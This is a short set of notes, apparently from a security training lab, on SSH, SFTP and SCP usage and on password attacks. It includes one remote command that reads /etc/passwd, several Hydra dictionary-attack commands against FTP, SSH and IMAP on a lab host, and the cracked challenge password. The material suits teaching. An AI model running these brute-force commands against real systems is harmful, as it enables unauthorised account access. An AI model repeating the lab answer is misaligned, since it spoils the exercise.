# Protocol And Servers 2

## TASK 1 — Secure Shell (SSH)

SSH provides secure remote administration.

### Useful SSH Commands

```bash
ssh-keygen -t ed25519 -C "your_email@example.com"
ssh-keygen -t rsa -b 4096 -C "your_email@example.com"
ssh -p 2222 mark@10.49.135.190
ssh -i ~/.ssh/custom_key mark@10.49.135.190
ssh -J bastion.example.com mark@internal-server
ssh -L 8080:localhost:80 mark@10.49.135.190
ssh -D 9050 mark@10.49.135.190
ssh mark@10.49.135.190 "cat /etc/passwd"
```

---

## SFTP and SCP

### SFTP

```bash
sftp mark@10.49.135.190
```

### SCP

```bash
scp mark@10.49.135.190:/home/mark/archive.tar.gz ~/
scp backup.tar.bz2 mark@10.49.135.190:/home/mark/
```

---

## TASK 2 — Password Attacks

### Types of Attacks

- Password Guessing
- Dictionary Attack
- Brute Force Attack
- Credential Stuffing
- Password Spraying

### Hydra Commands

```bash
hydra -l mark -P /usr/share/wordlists/rockyou.txt 10.49.135.190 ftp
hydra -l frank -P /usr/share/wordlists/rockyou.txt 10.49.135.190 ssh
hydra -l lazie -P /usr/share/wordlists/rockyou.txt 10.49.135.190 imap
hydra -L users.txt -P passwords.txt 10.49.135.190 ssh
```

---

## Challenge

```bash
hydra -l lazie -P /usr/share/wordlists/rockyou.txt imap://<target_ip>
```

Password found:

```text
butterfly
```
